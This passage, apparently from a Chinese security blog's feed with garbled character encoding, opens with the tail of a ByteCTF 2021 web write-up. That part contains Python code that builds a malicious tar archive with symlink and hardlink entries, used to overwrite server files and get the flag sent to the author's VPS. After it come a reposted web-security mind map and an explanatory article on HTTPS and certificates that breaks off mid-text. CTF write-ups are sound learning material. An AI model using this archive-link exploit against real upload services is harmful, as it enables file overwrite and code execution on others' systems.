punctuation">)</span>tarinfo31<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> SYMTYPEtarinfo31<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao\\2"</span>tarinfo31<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/"</span>tarinfo2 <span class="token operator">=</span> TarInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>tarinfo2<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">=</span> LNKTYPEtarinfo2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ao\\1/.npmrc"</span>tarinfo2<span class="token punctuation">.</span>linkname <span class="token operator">=</span> <span class="token string">"/app/data/app.js"</span><span class="token keyword">def</span> <span class="token function">make_tarfile</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>output_filename<span class="token punctuation">,</span> <span class="token string">"w:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        tar<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'npmrc'</span><span class="token punctuation">,</span> recursive<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>arcname<span class="token operator">=</span><span class="token string">"app.js"</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">"xxx.sh"</span><span class="token punctuation">,</span>recursive<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>arcname<span class="token operator">=</span><span class="token string">"xxx.sh"</span><span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo1<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo11<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo3<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo31<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>addfile<span class="token punctuation">(</span>tarinfo2<span class="token punctuation">)</span>make_tarfile<span class="token punctuation">(</span><span class="token string">"b.tar"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼  <code>b.tar</code>ï¼Œvps ä¸Šå¯çœ‹åˆ° flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF-2021-Web-WriteUp&quot;&gt;&lt;a href=&quot;#ByteCTF-2021-Web-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF 2021 Web WriteUp&quot;&gt;&lt;/a&gt;ByteCTF 2021 W</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Web å®‰å…¨åŸºç¡€çŸ¥è¯†æ€ç»´å¯¼å›¾</title>
    <link href="https://me.liki.link/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>https://me.liki.link/20210812/Web-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</id>
    <published>2021-08-12T04:14:17.000Z</published>
    <updated>2021-10-18T04:20:36.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è½¬è½½è‡ª Annevi</p><p>åœ¨æˆ‘æŸ¥æ¼è¡¥ç¼ºçš„æ—¶å€™å¸®åˆ°æˆ‘å¾ˆå¤š</p><div class="row">    <embed src="web.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è½¬è½½è‡ª Annevi&lt;/p&gt;
&lt;p&gt;åœ¨æˆ‘æŸ¥æ¼è¡¥ç¼ºçš„æ—¶å€™å¸®åˆ°æˆ‘å¾ˆå¤š&lt;/p&gt;


	&lt;div class=&quot;row&quot;&gt;
    &lt;embed s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTPS åè®®å­¦ä¹ </title>
    <link href="https://me.liki.link/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://me.liki.link/20210812/HTTPS-%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-08-12T04:11:32.000Z</published>
    <updated>2021-10-18T04:20:42.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰å®ä¹ é¢è¯•ä¹‹å‰å»å‚è€ƒäº† Annevi çš„åšå®¢ï¼Œ</p><p>å‘ç°äº†å¾ˆå¤šå¾ˆæ£’çš„è®°å½•ï¼Œ</p><p>æ‰“ç®—è½¬è½½ä¸€äº›</p><h2 id="ä»€ä¹ˆæ˜¯httpsï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯httpsï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯httpsï¼Ÿ"></a>ä»€ä¹ˆæ˜¯httpsï¼Ÿ</h2><p>httpsåè®®(Hyper Text Transfer Protocol over SecureSocket Layer)ï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯<code>å»ºç«‹åœ¨å®‰å…¨å¥—æ¥å­—å±‚ä¸Šçš„è¶…æ–‡æœ¬ä¼ è¾“åè®®(http)</code>ï¼Œå¾ˆæ˜¾ç„¶ï¼Œhttpsæ˜¯ä¸ºäº†ç¡®ä¿httpåè®®çš„å®‰å…¨æ€§è€Œå‡ºç°çš„ã€‚httpsåœ¨httpçš„åŸºç¡€ä¸ŠåŠ å…¥äº†<code>SSL</code>åè®®(SSL3.1åç§°TLS)ä»¥ä¸‹å‡ç§°TLSï¼Œé€šè¿‡<code>TLS</code>åè®®ä½¿å¾—httpæ•°æ®åŒ…èƒ½å¤Ÿå®‰å…¨çš„åœ¨ç½‘ç»œä¸­è¿›è¡Œä¼ è¾“ã€‚ç°åœ¨å¤§å¤šæ•°çš„ç«™ç‚¹éƒ½å·²ç»ä½¿ç”¨äº†httpsåè®®è¿›è¡Œé€šä¿¡ï¼Œä¹Ÿå°±æ˜¯åœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°çš„æ‰€è°“çš„<code>å°ç»¿é”</code>ğŸ”ã€‚</p><p><img src="https://cdn.annevi.cn/image-20210202142221315.png" alt="image-20210202142221315" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210202142221315.png" class="lozad post-image"></p><h2 id="ä¸ºä»€ä¹ˆéœ€è¦httpsï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦httpsï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦httpsï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦httpsï¼Ÿ</h2><p>é€šè¿‡ä¸Šé¢çš„ä»‹ç»å¯ä»¥çŸ¥é“ï¼Œä½¿ç”¨httpsæ˜¯ä¸ºäº†ç¡®ä¿httpé€šé“çš„å®‰å…¨æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªå®‰å…¨æ€§ç©¶ç«Ÿä½“ç°åœ¨å“ªé‡Œå‘¢ï¼Ÿ</p><p>åœ¨è¯´httpsæ‰€è§£å†³çš„å®‰å…¨é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ç§æ”»å‡»æ‰‹æ³•: <code>ä¸­é—´äººæ”»å‡»</code></p><blockquote><p><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼ˆè‹±è¯­ï¼š<strong>M</strong>an-<strong>i</strong>n-<strong>t</strong>he-<strong>m</strong>iddle attackï¼Œç¼©å†™ï¼š<strong>MITM</strong>ï¼‰åœ¨<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6">å¯†ç å­¦</a>å’Œ<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">è®¡ç®—æœºå®‰å…¨</a>é¢†åŸŸä¸­æ˜¯æŒ‡æ”»å‡»è€…ä¸é€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶äº¤æ¢å…¶æ‰€æ”¶åˆ°çš„æ•°æ®ï¼Œä½¿é€šè®¯çš„ä¸¤ç«¯è®¤ä¸ºä»–ä»¬æ­£åœ¨é€šè¿‡ä¸€ä¸ªç§å¯†çš„è¿æ¥ä¸å¯¹æ–¹ç›´æ¥å¯¹è¯ï¼Œä½†äº‹å®ä¸Šæ•´ä¸ªä¼šè¯éƒ½è¢«æ”»å‡»è€…å®Œå…¨æ§åˆ¶ã€‚åœ¨ä¸­é—´äººæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªé€šè®¯åŒæ–¹çš„é€šè¯å¹¶æ’å…¥æ–°çš„å†…å®¹ã€‚</p></blockquote><p>ä»ä¸Šè¿°èµ„æ–™ä¸­å¯ä»¥çŸ¥é“ï¼Œä¸­é—´äººæ”»å‡»å®é™…ä¸Šå°±æ˜¯æ”»å‡»è€…ç›‘å¬å¹¶æˆªè·äº†é€šä¿¡åŒæ–¹çš„æ•°æ®ï¼Œå¯¹è¿™äº›æ•°æ®åŠ ä»¥ä¿®æ”¹åä»£æ›¿åŸæœ‰çš„å‘é€æ–¹å°†ä¿®æ”¹åçš„ä¿¡æ¯å‘é€ç»™åŸå…ˆçš„æ¥æ”¶æ–¹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸­é—´äººå°±ç›¸å½“äºæ˜¯ä¸€ä¸ªâ€é€æ˜ä»£ç†â€œï¼Œé€šä¿¡åŒæ–¹å¹¶ä¸çŸ¥é“æœ‰è¿™ä¸ªâ€ä¸­é—´äººâ€œçš„å­˜åœ¨ã€‚</p><p>è€Œè¦æˆåŠŸçš„è¿›è¡Œä¸­é—´äººæ”»å‡»æ˜¯æœ‰æ¡ä»¶çš„ï¼š</p><blockquote><p>ä¸€ä¸ªä¸­é—´äººæ”»å‡»èƒ½æˆåŠŸçš„å‰ææ¡ä»¶æ˜¯æ”»å‡»è€…èƒ½å°†è‡ªå·±ä¼ªè£…æˆæ¯ä¸€ä¸ªå‚ä¸ä¼šè¯çš„ç»ˆç«¯ï¼Œå¹¶ä¸”ä¸è¢«å…¶ä»–ç»ˆç«¯è¯†ç ´ã€‚ä¸­é—´äººæ”»å‡»æ˜¯ä¸€ä¸ªï¼ˆç¼ºä¹ï¼‰ç›¸äº’<a href="https://zh.wikipedia.org/wiki/%E8%AE%A4%E8%AF%81">è®¤è¯</a>çš„æ”»å‡»ã€‚</p></blockquote><p>å›åˆ°httpæ•°æ®åŒ…ç½‘ç»œé€šä¿¡è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“httpåè®®çš„æ•°æ®æ˜¯åœ¨ä¼ è¾“å±‚é€šè¿‡TCPåè®®è¿›è¡Œå°è£…ä¼ è¾“çš„ï¼Œè€ŒTCPåè®®åœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­åˆ™æ˜¯ä»¥æ˜æ–‡å½¢å¼è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯åœ¨httpæ•°æ®åŒ…åœ¨ç½‘ç»œä¸­æ˜æ–‡â€è£¸å¥”â€ã€‚</p><p><img src="https://cdn.annevi.cn/http.png" alt="http" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/http.png" class="lozad post-image"></p><p>TCPåè®®è™½ç¡®ä¿äº†é€šä¿¡åŒæ–¹çš„<code>å¯é äº¤ä»˜</code>ä½†æ˜¯å¹¶æ²¡æœ‰å¯¹é€šä¿¡åŒæ–¹è¿›è¡Œ<code>èº«ä»½è®¤è¯</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œhttpå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“ä¸è‡ªå·±é€šä¿¡çš„æ˜¯ä¸æ˜¯æƒ³è¦è®¿é—®çš„â€çœŸå®â€æœåŠ¡ç«¯ï¼Œå› æ­¤å°±ç»™ä¸­é—´äººæ”»å‡»æä¾›äº†æœºä¼šã€‚</p><p>ç”±äºHTTPå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»çš„é—®é¢˜ï¼Œäººä»¬åœ¨æ€è€ƒå¦‚ä½•è§£å†³è¿™ä¸€å®‰å…¨é—®é¢˜çš„æ—¶å€™æå‡ºäº†httpsåè®®ï¼Œhttpsåè®®é€šè¿‡SSLå±‚å¯¹httpæ•°æ®åŒ…è¿›è¡ŒåŠ å¯†ï¼ŒåŒæ—¶ä½¿ç”¨æ•°å­—è¯ä¹¦ç­‰æ‰‹æ®µå¯¹é€šä¿¡åŒæ–¹çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œè¾ƒå¥½çš„è§£å†³äº†è¿™ä¸€å®‰å…¨é—®é¢˜ã€‚</p><h2 id="httpså…·ä½“å·¥ä½œè¿‡ç¨‹"><a href="#httpså…·ä½“å·¥ä½œè¿‡ç¨‹" class="headerlink" title="httpså…·ä½“å·¥ä½œè¿‡ç¨‹"></a>httpså…·ä½“å·¥ä½œè¿‡ç¨‹</h2><p>é€šè¿‡ä¸Šé¢çš„ä»‹ç»å¯ä»¥çŸ¥é“ï¼Œhttpsæ˜¯å°†httpåè®®é€šè¿‡TLSçš„å°è£…åçš„ä¸€ç§å®‰å…¨åè®®ã€‚httpä¸httpsåœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­çš„åŸºæœ¬ç»“æ„å¦‚ä¸‹</p><p><img src="https://cdn.annevi.cn/image-20210202164732706.png" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210202164732706.png" class="lozad post-image"></p><p>httpsåè®®åœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­é¦–å…ˆå°†httpåŸå§‹è¯·æ±‚åŒ…ç»è¿‡TLSå±‚è¿›è¡ŒåŠ å¯†å°è£…å†é€å…¥ä¼ è¾“å±‚è¿›è¡ŒTCPä¼ è¾“ã€‚</p><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>åœ¨ä»‹ç»httpså·¥ä½œåŸç†ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç®€å•çš„äº†è§£ä¸€äº›å¯†ç å­¦çš„åŸºç¡€çŸ¥è¯†</p><h4 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h4><blockquote><p>å¯¹ç§°åŠ å¯†æ˜¯æœ€å¿«é€Ÿã€æœ€ç®€å•çš„ä¸€ç§åŠ å¯†æ–¹å¼ï¼ŒåŠ å¯†ï¼ˆencryptionï¼‰ä¸è§£å¯†ï¼ˆdecryptionï¼‰ç”¨çš„æ˜¯åŒæ ·çš„å¯†é’¥ï¼ˆsecret keyï¼‰ã€‚</p></blockquote><p>å¯¹ç§°åŠ å¯†å…¶ç‰¹ç‚¹ä¸»è¦æ˜¯æ•ˆç‡é«˜ã€é€Ÿåº¦å¿«ï¼Œä½†æ˜¯å®‰å…¨æ€§å·®ï¼Œç”±äºåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤å¯†é’¥ç®¡ç†è´Ÿæ‹…è¾ƒé‡ã€‚ä¸»è¦ç®—æ³•æœ‰DESã€3DESã€AESã€RC5ã€RC6ç­‰ã€‚</p><h4 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h4><blockquote><p>éå¯¹ç§°åŠ å¯†åŠ ã€è§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ï¼Œä¸€æŠŠä½œä¸ºå…¬å¼€çš„å…¬é’¥ï¼Œå¦ä¸€æŠŠä½œä¸ºç§é’¥ã€‚å…¬é’¥åŠ å¯†çš„ä¿¡æ¯ï¼Œåªæœ‰ç§é’¥æ‰èƒ½è§£å¯†ã€‚åä¹‹ï¼Œç§é’¥åŠ å¯†çš„ä¿¡æ¯ï¼Œåªæœ‰å…¬é’¥æ‰èƒ½è§£å¯†ã€‚</p></blockquote><p>éå¯¹ç§°åŠ å¯†ç”±äºå…¶åŠ è§£å¯†å¯†é’¥ä¸åŒè€Œå¾—åï¼Œå…¶å®‰å…¨æ€§æ›´é«˜ï¼Œå¯†é’¥ç®¡ç†æ–¹ä¾¿ã€‚ä½†æ˜¯åŠ å¯†å’Œè§£å¯†è€—æ—¶é•¿ï¼Œæ•ˆç‡å·®ã€‚</p><p>ä¸å¯¹ç§°åŠ å¯†ç›¸æ¯”ï¼Œéå¯¹ç§°åŠ å¯†æ— éœ€åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´å…±äº«å¯†é’¥ï¼Œåªè¦ç§é’¥ä¸å‘é€ç»™ä»»ä½•ç”¨æˆ·ï¼Œå³æ˜¯å…¬é’¥åœ¨äº’è”ç½‘ä¸Šè¢«æˆªè·ï¼Œä¹Ÿæ— æ³•è¢«è§£å¯†ï¼Œè€Œåªæœ‰å…¬é’¥æ˜¯æ²¡æœ‰ä»»ä½•æ”»å‡»ä»·å€¼çš„ã€‚å¸¸è§çš„éå¯¹ç§°åŠ å¯†ç®—æ³•æœ‰RSAç­‰ï¼Œéå¯¹ç§°åŠ è§£å¯†è¿‡ç¨‹ï¼š</p><ol><li>æœåŠ¡ç«¯ç”Ÿæˆä¸€å †å…¬é’¥å’Œç§é’¥</li><li>ç§é’¥ä»…ç”±æœåŠ¡ç«¯ä¿å­˜ï¼Œå…¬é’¥é€šè¿‡äº’è”ç½‘å‘é€ç»™å®¢æˆ·ç«¯ã€‚</li><li>å®¢æˆ·ç«¯ä½¿ç”¨å…¬é’¥åŠ å¯†æ˜æ–‡å¹¶åœ¨ç½‘ç»œä¸­ä¼ è¾“ç»™æœåŠ¡ç«¯</li><li>æœåŠ¡ç«¯ä½¿ç”¨è‡ªå·±æŒæœ‰çš„ç§é’¥è§£å¯†å¯†æ–‡å¾—åˆ°å¯¹åº”çš„æ˜æ–‡</li></ol><h4 id="æ•°å­—ç­¾å"><a href="#æ•°å­—ç­¾å" class="headerlink" title="æ•°å­—ç­¾å"></a>æ•°å­—ç­¾å</h4><p>åœ¨ä¸€å°ä¿¡ä¸­ï¼Œæ–‡æœ«çš„ç­¾åæ˜¯ä¸ºäº†è¡¨ç¤ºè¿™å°ä¿¡æ˜¯ç­¾åè€…å†™çš„ã€‚è®¡ç®—æœºä¸­ï¼Œæ•°å­—ç­¾åä¹Ÿæ˜¯ç›¸åŒçš„å«ä¹‰ï¼šè¯æ˜æ¶ˆæ¯æ˜¯æŸä¸ªç‰¹å®šçš„äººï¼Œè€Œä¸æ˜¯éšéšä¾¿ä¾¿ä¸€ä¸ªäººå‘é€çš„ï¼ˆæœ‰æ•ˆæ€§ï¼‰ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œæ•°å­—ç­¾åè¿˜èƒ½è¯æ˜æ¶ˆæ¯æ²¡æœ‰è¢«ç¯¡æ”¹ï¼ˆå®Œæ•´æ€§ï¼‰ã€‚</p><blockquote><p>ç®€å•æ¥è¯´ï¼Œæ•°å­—ç­¾åï¼ˆdigital signatureï¼‰æ˜¯å…¬é’¥å¯†ç çš„é€†åº”ç”¨ï¼šç”¨<strong>ç§é’¥</strong>åŠ å¯†æ¶ˆæ¯ï¼Œç”¨<strong>å…¬é’¥</strong>è§£å¯†æ¶ˆæ¯ã€‚</p><p>ç”¨ç§é’¥åŠ å¯†çš„æ¶ˆæ¯ç§°ä¸º<strong>ç­¾å</strong>ï¼Œåªæœ‰æ‹¥æœ‰ç§é’¥çš„ç”¨æˆ·å¯ä»¥ç”Ÿæˆç­¾åã€‚<br>ç”¨å…¬é’¥è§£å¯†ç­¾åè¿™ä¸€æ­¥ç§°ä¸º<strong>éªŒè¯ç­¾å</strong>ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥éªŒè¯ç­¾å(å› ä¸ºå…¬é’¥æ˜¯å…¬å¼€çš„)</p></blockquote><p>ç­¾åçš„ç”Ÿæˆï¼Œä¸€èˆ¬æ¥è¯´ï¼Œä¸ç›´æ¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œè€Œæ˜¯å¯¹æ¶ˆæ¯çš„å“ˆå¸Œå€¼è¿›è¡Œç­¾åï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚</p><ol><li>å¯¹æ¶ˆæ¯è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œå¾—åˆ°å“ˆå¸Œå€¼</li><li>åˆ©ç”¨ç§é’¥å¯¹å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆç­¾å</li><li>å°†ç­¾åé™„åŠ åœ¨æ¶ˆæ¯åé¢ï¼Œä¸€èµ·å‘é€è¿‡å»</li></ol><p>ç­¾åçš„éªŒè¯</p><ol><li>æ”¶åˆ°æ¶ˆæ¯åï¼Œæå–æ¶ˆæ¯ä¸­çš„ç­¾å</li><li>ç”¨å…¬é’¥å¯¹ç­¾åè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å“ˆå¸Œå€¼1ã€‚</li><li>å¯¹æ¶ˆæ¯ä¸­çš„æ­£æ–‡è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œå¾—åˆ°å“ˆå¸Œå€¼2ã€‚</li><li>æ¯”è¾ƒå“ˆå¸Œå€¼1å’Œå“ˆå¸Œå€¼2ï¼Œå¦‚æœç›¸åŒï¼Œåˆ™éªŒè¯æˆåŠŸã€‚</li></ol><p><strong>ç®€å•åœ°è¯´ï¼Œæ•°å­—ç­¾åå°±æ˜¯ä½¿ç”¨<code>ç§é’¥</code>å»åŠ å¯†<code>æ¶ˆæ¯æ‘˜è¦</code>å¾—åˆ°çš„å¯†æ–‡ã€‚</strong></p><h4 id="æ•°å­—è¯ä¹¦"><a href="#æ•°å­—è¯ä¹¦" class="headerlink" title="æ•°å­—è¯ä¹¦"></a>æ•°å­—è¯ä¹¦</h4><p>è¯ä¹¦å®é™…ä¸Šå°±æ˜¯å¯¹<strong>å…¬é’¥</strong>è¿›è¡Œæ•°å­—ç­¾åï¼Œå®ƒæ˜¯å¯¹å…¬é’¥åˆæ³•æ€§æä¾›è¯æ˜çš„æŠ€æœ¯ã€‚</p><blockquote><p>æ•°å­—è¯ä¹¦æ˜¯æŒ‡åœ¨äº’è”ç½‘é€šè®¯ä¸­æ ‡å¿—é€šè®¯å„æ–¹èº«ä»½ä¿¡æ¯çš„ä¸€ä¸ªæ•°å­—è®¤è¯ï¼Œäººä»¬å¯ä»¥åœ¨ç½‘ä¸Šç”¨å®ƒæ¥è¯†åˆ«å¯¹æ–¹çš„èº«ä»½ã€‚æ•°å­—è¯ä¹¦å¯¹ç½‘ç»œç”¨æˆ·åœ¨è®¡ç®—æœºç½‘ç»œäº¤æµä¸­çš„ä¿¡æ¯å’Œæ•°æ®ç­‰ä»¥åŠ å¯†æˆ–è§£å¯†çš„å½¢å¼ä¿è¯äº†ä¿¡æ¯å’Œæ•°æ®çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚</p></blockquote><p>è€ƒè™‘è¿™æ ·ä¸€ç§åœºæ™¯ï¼šæˆ‘ä»¬å¯¹ç­¾åè¿›è¡ŒéªŒè¯æ—¶ï¼Œéœ€è¦ç”¨åˆ°å…¬é’¥ã€‚å¦‚æœå…¬é’¥ä¹Ÿæ˜¯ä¼ªé€ çš„ï¼Œé‚£æ€ä¹ˆåŠï¼Ÿå¦‚æœå…¬é’¥æ˜¯å‡çš„ï¼ŒéªŒè¯æ•°å­—ç­¾åé‚£å°±æ— ä»è°ˆèµ·ï¼Œæ ¹æœ¬ä¸å¯èƒ½ä»æ•°å­—ç­¾åç¡®å®šå¯¹æ–¹çš„åˆæ³•æ€§ã€‚</p><p>åœ¨éå¯¹ç§°åŠ å¯†é€šä¿¡è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨éœ€è¦å°†å…¬é’¥å‘é€ç»™å®¢æˆ·ç«¯ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œå…¬é’¥å¾ˆå¯èƒ½ä¼šè¢«ç¬¬ä¸‰æ–¹æ‹¦æˆªå¹¶æ›¿æ¢ï¼Œç„¶åè¿™ä¸ªç¬¬ä¸‰æ–¹å°±å¯ä»¥å†’å……æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ï¼Œè¿™å°±æ˜¯ä¼ è¯´ä¸­çš„â€œä¸­é—´äººæ”»å‡»â€(man in the middle attack)ã€‚è§£å†³æ­¤é—®é¢˜çš„æ–¹æ³•æ˜¯é€šè¿‡å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹äº¤æ¢å…¬é’¥ï¼Œå…·ä½“åšæ³•å°±æ˜¯æœåŠ¡å™¨ä¸ç›´æ¥å‘å®¢æˆ·ç«¯å‘é€å…¬é’¥ï¼Œè€Œæ˜¯è¦æ±‚å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ï¼Œä¹Ÿå°±æ˜¯è¯ä¹¦è®¤è¯æœºæ„ (Certificate Authority, ç®€ç§° CA)å°†å…¬é’¥åˆå¹¶åˆ°æ•°å­—è¯ä¹¦ä¸­ï¼Œç„¶åæœåŠ¡å™¨ä¼šæŠŠå…¬é’¥è¿åŒè¯ä¹¦ä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œç§é’¥åˆ™ç”±æœåŠ¡å™¨è‡ªå·±ä¿å­˜ä»¥ç¡®ä¿å®‰å…¨ã€‚æ•°å­—è¯ä¹¦ä¸€èˆ¬åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li>è¯ä¹¦æ‰€æœ‰è€…çš„å…¬é’¥</li><li>è¯ä¹¦æ‰€æœ‰è€…çš„ä¸“æœ‰åç§°</li><li>è¯ä¹¦é¢å‘æœºæ„çš„ä¸“æœ‰åç§°</li><li>è¯ä¹¦çš„æœ‰æ•ˆèµ·å§‹æ—¥æœŸ</li><li>è¯ä¹¦çš„è¿‡æœŸæ—¥æœŸ</li><li>è¯ä¹¦æ•°æ®æ ¼å¼çš„ç‰ˆæœ¬å·</li><li>åºåˆ—å·ï¼Œè¿™æ˜¯è¯ä¹¦é¢å‘æœºæ„ä¸ºè¯¥è¯ä¹¦åˆ†é…çš„å”¯ä¸€æ ‡è¯†ç¬¦</li></ol><p><img src="https://cdn.annevi.cn/image-20210205153627722.png" alt="image-20210205153627722" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20210205153627722.png" class="lozad post-image"></p><p>æ¥ä¸‹æ¥åˆæœ‰é—®é¢˜äº†ï¼šéªŒè¯è¯ä¹¦ä¸­çš„æ•°å­—ç­¾åéœ€è¦å¦ä¸€ä¸ªå…¬é’¥ï¼Œé‚£ä¹ˆè¿™ä¸ªå…¬é’¥çš„åˆæ³•æ€§åˆè¯¥å¦‚ä½•ä¿è¯ï¼Ÿè¯¥é—®é¢˜å¯ä»¥æ— é™å¾ªç¯ä¸‹å»ï¼Œå²‚ä¸æ˜¯åˆ°ä¸äº†å¤´äº†ï¼Ÿè¿™å·²ç»æ˜¯ä¸ªç¤¾ä¼šå­¦é—®é¢˜äº†ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆæŠŠé’±å­˜è¿›é“¶è¡Œï¼Ÿå› ä¸ºæˆ‘ä»¬ç›¸ä¿¡é“¶è¡Œï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯ä¿¡çš„æœºæ„ï¼ˆè™½ç„¶ä¹Ÿæœ‰ç 